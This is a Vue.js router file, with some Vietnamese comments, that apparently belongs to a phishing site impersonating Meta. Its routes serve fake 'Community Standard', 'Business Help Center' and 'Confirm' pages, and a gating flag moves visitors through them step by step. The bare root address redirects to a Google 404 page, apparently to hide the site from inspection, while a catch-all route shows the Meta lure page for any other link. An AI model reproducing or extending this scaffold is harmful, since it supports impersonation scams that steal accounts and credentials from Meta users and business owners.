import { createRouter, createWebHistory } from 'vue-router';
import MetaCommunityStandard from '@/views/MetaCommunityStandard.vue';
import MetaBusinessHelpCenter from '@/views/MetaBusinessHelpCenter.vue';
import MetaConfirm from '@/views/MetaConfirm.vue';
import NotFound from '@/views/NotFound.vue';
// import Home from '@/views/HomeView.vue';
//import VueMeta from 'vue-meta';

// Vue.config.productionTip = false;
// Vue.use(VueRouter);
// Vue.use(VueMeta);

const routes = [
  {
    path: '/',
    name: 'Home Page',
    component: NotFound, 
    beforeEnter: (to, from, next) => {
      window.location.href = 'https://www.google.com/404';
    }
  },
  
  {
    path: '/:catchAll(.*)', // Đường dẫn đại diện
    component: MetaCommunityStandard, // Component mà mọi đường dẫn sẽ chuyển hướng đến
  },
  {
    path: '/business-help-center',
    name: 'Meta Business Help Center',
    component: MetaBusinessHelpCenter,
    meta: { canAccessNextPage: false },
  },
  {
    path: '/confirm',
    name: 'Meta Confirm',
    component: MetaConfirm,
    meta: { canAccessNextPage: false },
  },
  {
    path: '/error',
    name: 'Not Found',
    component: NotFound,
  },
  {
    path: '/:catchAll(.*)',
    redirect: '/error',
  }
];

const router = createRouter({
  history: createWebHistory(),
  routes,
});

// new Vue({
//   router,
//   render: h => h(App),
//   metaInfo() {
//     return {
//       titleTemplate: '%s - Your Website',
//     };
//   },
//   watch: {
//     $route(to) {
//       this.updateMetaTags(to.meta);
//     }
//   },
//   methods: {
//     updateMetaTags(meta) {
//       if (meta) {
//         this.$meta().refresh();
//       }
//     }
//   }
// }).$mount('#app');

export default router;
